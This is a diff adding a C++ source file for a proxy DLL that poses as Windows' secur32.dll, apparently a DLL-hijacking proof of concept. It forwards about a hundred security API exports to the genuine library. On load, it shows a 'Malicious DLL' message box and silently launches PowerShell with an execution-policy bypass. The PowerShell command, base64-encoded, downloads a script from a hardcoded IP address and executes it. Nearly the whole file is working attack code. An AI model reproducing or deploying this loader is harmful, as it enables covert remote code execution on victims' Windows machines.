@@ -1,0 +1,153 @@
+
+// dllmain.cpp : Defines the entry point for the DLL application.
+#include "pch.h"
+
+
+
+#include "pch.h"
+
+#include <Windows.h>
+
+#ifdef _WIN64
+#define DLLPATH "\\\\.\\GLOBALROOT\\SystemRoot\\System32\\secur32.dll"
+#else
+#define DLLPATH "\\\\.\\GLOBALROOT\\SystemRoot\\SysWOW64\\secur32.dll"
+#endif // _WIN64
+
+#pragma comment(linker, "/EXPORT:AcceptSecurityContext=" DLLPATH ".AcceptSecurityContext")
+#pragma comment(linker, "/EXPORT:AcquireCredentialsHandleA=" DLLPATH ".AcquireCredentialsHandleA")
+#pragma comment(linker, "/EXPORT:AcquireCredentialsHandleW=" DLLPATH ".AcquireCredentialsHandleW")
+#pragma comment(linker, "/EXPORT:AddCredentialsA=" DLLPATH ".AddCredentialsA")
+#pragma comment(linker, "/EXPORT:AddCredentialsW=" DLLPATH ".AddCredentialsW")
+#pragma comment(linker, "/EXPORT:AddSecurityPackageA=" DLLPATH ".AddSecurityPackageA")
+#pragma comment(linker, "/EXPORT:AddSecurityPackageW=" DLLPATH ".AddSecurityPackageW")
+#pragma comment(linker, "/EXPORT:ApplyControlToken=" DLLPATH ".ApplyControlToken")
+#pragma comment(linker, "/EXPORT:ChangeAccountPasswordA=" DLLPATH ".ChangeAccountPasswordA")
+#pragma comment(linker, "/EXPORT:ChangeAccountPasswordW=" DLLPATH ".ChangeAccountPasswordW")
+#pragma comment(linker, "/EXPORT:CloseLsaPerformanceData=" DLLPATH ".CloseLsaPerformanceData")
+#pragma comment(linker, "/EXPORT:CollectLsaPerformanceData=" DLLPATH ".CollectLsaPerformanceData")
+#pragma comment(linker, "/EXPORT:CompleteAuthToken=" DLLPATH ".CompleteAuthToken")
+#pragma comment(linker, "/EXPORT:CredMarshalTargetInfo=" DLLPATH ".CredMarshalTargetInfo")
+#pragma comment(linker, "/EXPORT:CredUnmarshalTargetInfo=" DLLPATH ".CredUnmarshalTargetInfo")
+#pragma comment(linker, "/EXPORT:DecryptMessage=" DLLPATH ".DecryptMessage")
+#pragma comment(linker, "/EXPORT:DeleteSecurityContext=" DLLPATH ".DeleteSecurityContext")
+#pragma comment(linker, "/EXPORT:DeleteSecurityPackageA=" DLLPATH ".DeleteSecurityPackageA")
+#pragma comment(linker, "/EXPORT:DeleteSecurityPackageW=" DLLPATH ".DeleteSecurityPackageW")
+#pragma comment(linker, "/EXPORT:EncryptMessage=" DLLPATH ".EncryptMessage")
+#pragma comment(linker, "/EXPORT:EnumerateSecurityPackagesA=" DLLPATH ".EnumerateSecurityPackagesA")
+#pragma comment(linker, "/EXPORT:EnumerateSecurityPackagesW=" DLLPATH ".EnumerateSecurityPackagesW")
+#pragma comment(linker, "/EXPORT:ExportSecurityContext=" DLLPATH ".ExportSecurityContext")
+#pragma comment(linker, "/EXPORT:FreeContextBuffer=" DLLPATH ".FreeContextBuffer")
+#pragma comment(linker, "/EXPORT:FreeCredentialsHandle=" DLLPATH ".FreeCredentialsHandle")
+#pragma comment(linker, "/EXPORT:GetComputerObjectNameA=" DLLPATH ".GetComputerObjectNameA")
+#pragma comment(linker, "/EXPORT:GetComputerObjectNameW=" DLLPATH ".GetComputerObjectNameW")
+#pragma comment(linker, "/EXPORT:GetSecurityUserInfo=" DLLPATH ".GetSecurityUserInfo")
+#pragma comment(linker, "/EXPORT:GetUserNameExA=" DLLPATH ".GetUserNameExA")
+#pragma comment(linker, "/EXPORT:GetUserNameExW=" DLLPATH ".GetUserNameExW")
+#pragma comment(linker, "/EXPORT:ImpersonateSecurityContext=" DLLPATH ".ImpersonateSecurityContext")
+#pragma comment(linker, "/EXPORT:ImportSecurityContextA=" DLLPATH ".ImportSecurityContextA")
+#pragma comment(linker, "/EXPORT:ImportSecurityContextW=" DLLPATH ".ImportSecurityContextW")
+#pragma comment(linker, "/EXPORT:InitSecurityInterfaceA=" DLLPATH ".InitSecurityInterfaceA")
+#pragma comment(linker, "/EXPORT:InitSecurityInterfaceW=" DLLPATH ".InitSecurityInterfaceW")
+#pragma comment(linker, "/EXPORT:InitializeSecurityContextA=" DLLPATH ".InitializeSecurityContextA")
+#pragma comment(linker, "/EXPORT:InitializeSecurityContextW=" DLLPATH ".InitializeSecurityContextW")
+#pragma comment(linker, "/EXPORT:LsaCallAuthenticationPackage=" DLLPATH ".LsaCallAuthenticationPackage")
+#pragma comment(linker, "/EXPORT:LsaConnectUntrusted=" DLLPATH ".LsaConnectUntrusted")
+#pragma comment(linker, "/EXPORT:LsaDeregisterLogonProcess=" DLLPATH ".LsaDeregisterLogonProcess")
+#pragma comment(linker, "/EXPORT:LsaEnumerateLogonSessions=" DLLPATH ".LsaEnumerateLogonSessions")
+#pragma comment(linker, "/EXPORT:LsaFreeReturnBuffer=" DLLPATH ".LsaFreeReturnBuffer")
+#pragma comment(linker, "/EXPORT:LsaGetLogonSessionData=" DLLPATH ".LsaGetLogonSessionData")
+#pragma comment(linker, "/EXPORT:LsaLogonUser=" DLLPATH ".LsaLogonUser")
+#pragma comment(linker, "/EXPORT:LsaLookupAuthenticationPackage=" DLLPATH ".LsaLookupAuthenticationPackage")
+#pragma comment(linker, "/EXPORT:LsaRegisterLogonProcess=" DLLPATH ".LsaRegisterLogonProcess")
+#pragma comment(linker, "/EXPORT:LsaRegisterPolicyChangeNotification=" DLLPATH ".LsaRegisterPolicyChangeNotification")
+#pragma comment(linker, "/EXPORT:LsaUnregisterPolicyChangeNotification=" DLLPATH ".LsaUnregisterPolicyChangeNotification")
+#pragma comment(linker, "/EXPORT:MakeSignature=" DLLPATH ".MakeSignature")
+#pragma comment(linker, "/EXPORT:OpenLsaPerformanceData=" DLLPATH ".OpenLsaPerformanceData")
+#pragma comment(linker, "/EXPORT:QueryContextAttributesA=" DLLPATH ".QueryContextAttributesA")
+#pragma comment(linker, "/EXPORT:QueryContextAttributesW=" DLLPATH ".QueryContextAttributesW")
+#pragma comment(linker, "/EXPORT:QueryCredentialsAttributesA=" DLLPATH ".QueryCredentialsAttributesA")
+#pragma comment(linker, "/EXPORT:QueryCredentialsAttributesW=" DLLPATH ".QueryCredentialsAttributesW")
+#pragma comment(linker, "/EXPORT:QuerySecurityContextToken=" DLLPATH ".QuerySecurityContextToken")
+#pragma comment(linker, "/EXPORT:QuerySecurityPackageInfoA=" DLLPATH ".QuerySecurityPackageInfoA")
+#pragma comment(linker, "/EXPORT:QuerySecurityPackageInfoW=" DLLPATH ".QuerySecurityPackageInfoW")
+#pragma comment(linker, "/EXPORT:RevertSecurityContext=" DLLPATH ".RevertSecurityContext")
+#pragma comment(linker, "/EXPORT:SaslAcceptSecurityContext=" DLLPATH ".SaslAcceptSecurityContext")
+#pragma comment(linker, "/EXPORT:SaslEnumerateProfilesA=" DLLPATH ".SaslEnumerateProfilesA")
+#pragma comment(linker, "/EXPORT:SaslEnumerateProfilesW=" DLLPATH ".SaslEnumerateProfilesW")
+#pragma comment(linker, "/EXPORT:SaslGetContextOption=" DLLPATH ".SaslGetContextOption")
+#pragma comment(linker, "/EXPORT:SaslGetProfilePackageA=" DLLPATH ".SaslGetProfilePackageA")
+#pragma comment(linker, "/EXPORT:SaslGetProfilePackageW=" DLLPATH ".SaslGetProfilePackageW")
+#pragma comment(linker, "/EXPORT:SaslIdentifyPackageA=" DLLPATH ".SaslIdentifyPackageA")
+#pragma comment(linker, "/EXPORT:SaslIdentifyPackageW=" DLLPATH ".SaslIdentifyPackageW")
+#pragma comment(linker, "/EXPORT:SaslInitializeSecurityContextA=" DLLPATH ".SaslInitializeSecurityContextA")
+#pragma comment(linker, "/EXPORT:SaslInitializeSecurityContextW=" DLLPATH ".SaslInitializeSecurityContextW")
+#pragma comment(linker, "/EXPORT:SaslSetContextOption=" DLLPATH ".SaslSetContextOption")
+#pragma comment(linker, "/EXPORT:SealMessage=" DLLPATH ".SealMessage")
+#pragma comment(linker, "/EXPORT:SeciAllocateAndSetCallFlags=" DLLPATH ".SeciAllocateAndSetCallFlags")
+#pragma comment(linker, "/EXPORT:SeciAllocateAndSetIPAddress=" DLLPATH ".SeciAllocateAndSetIPAddress")
+#pragma comment(linker, "/EXPORT:SeciFreeCallContext=" DLLPATH ".SeciFreeCallContext")
+#pragma comment(linker, "/EXPORT:SecpFreeMemory=" DLLPATH ".SecpFreeMemory")
+#pragma comment(linker, "/EXPORT:SecpTranslateName=" DLLPATH ".SecpTranslateName")
+#pragma comment(linker, "/EXPORT:SecpTranslateNameEx=" DLLPATH ".SecpTranslateNameEx")
+#pragma comment(linker, "/EXPORT:SetContextAttributesA=" DLLPATH ".SetContextAttributesA")
+#pragma comment(linker, "/EXPORT:SetContextAttributesW=" DLLPATH ".SetContextAttributesW")
+#pragma comment(linker, "/EXPORT:SetCredentialsAttributesA=" DLLPATH ".SetCredentialsAttributesA")
+#pragma comment(linker, "/EXPORT:SetCredentialsAttributesW=" DLLPATH ".SetCredentialsAttributesW")
+#pragma comment(linker, "/EXPORT:SspiCompareAuthIdentities=" DLLPATH ".SspiCompareAuthIdentities")
+#pragma comment(linker, "/EXPORT:SspiCopyAuthIdentity=" DLLPATH ".SspiCopyAuthIdentity")
+#pragma comment(linker, "/EXPORT:SspiDecryptAuthIdentity=" DLLPATH ".SspiDecryptAuthIdentity")
+#pragma comment(linker, "/EXPORT:SspiEncodeAuthIdentityAsStrings=" DLLPATH ".SspiEncodeAuthIdentityAsStrings")
+#pragma comment(linker, "/EXPORT:SspiEncodeStringsAsAuthIdentity=" DLLPATH ".SspiEncodeStringsAsAuthIdentity")
+#pragma comment(linker, "/EXPORT:SspiEncryptAuthIdentity=" DLLPATH ".SspiEncryptAuthIdentity")
+#pragma comment(linker, "/EXPORT:SspiExcludePackage=" DLLPATH ".SspiExcludePackage")
+#pragma comment(linker, "/EXPORT:SspiFreeAuthIdentity=" DLLPATH ".SspiFreeAuthIdentity")
+#pragma comment(linker, "/EXPORT:SspiGetTargetHostName=" DLLPATH ".SspiGetTargetHostName")
+#pragma comment(linker, "/EXPORT:SspiIsAuthIdentityEncrypted=" DLLPATH ".SspiIsAuthIdentityEncrypted")
+#pragma comment(linker, "/EXPORT:SspiLocalFree=" DLLPATH ".SspiLocalFree")
+#pragma comment(linker, "/EXPORT:SspiMarshalAuthIdentity=" DLLPATH ".SspiMarshalAuthIdentity")
+#pragma comment(linker, "/EXPORT:SspiPrepareForCredRead=" DLLPATH ".SspiPrepareForCredRead")
+#pragma comment(linker, "/EXPORT:SspiPrepareForCredWrite=" DLLPATH ".SspiPrepareForCredWrite")
+#pragma comment(linker, "/EXPORT:SspiUnmarshalAuthIdentity=" DLLPATH ".SspiUnmarshalAuthIdentity")
+#pragma comment(linker, "/EXPORT:SspiValidateAuthIdentity=" DLLPATH ".SspiValidateAuthIdentity")
+#pragma comment(linker, "/EXPORT:SspiZeroAuthIdentity=" DLLPATH ".SspiZeroAuthIdentity")
+#pragma comment(linker, "/EXPORT:TranslateNameA=" DLLPATH ".TranslateNameA")
+#pragma comment(linker, "/EXPORT:TranslateNameW=" DLLPATH ".TranslateNameW")
+#pragma comment(linker, "/EXPORT:UnsealMessage=" DLLPATH ".UnsealMessage")
+#pragma comment(linker, "/EXPORT:VerifySignature=" DLLPATH ".VerifySignature")
+
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+    {
+        MessageBoxA(NULL, "Executing from Malicious DLL", "Executing from Malicious DLL", 0);
+        STARTUPINFOA si = { 0 };
+        PROCESS_INFORMATION pi = { 0 };
+        si.cb = sizeof(si);
+
+        CreateProcessA(
+            NULL,
+            (LPSTR)"cmd.exe /c powershell -ep bypass -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAOQAuADEAMgA4ADoAOAAwADAAMAAvAHIAdQBuAC4AdAB4AHQAJwApACAAfABJAEUAWAAKAA== -WindowStyle Hidden",
+            NULL,
+            NULL,
+            FALSE,
+            0,
+            NULL,
+            NULL,
+            &si,
+            &pi
+        );
+    }
+    case DLL_THREAD_ATTACH:
+        break;
+    case DLL_THREAD_DETACH:
+        break;
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
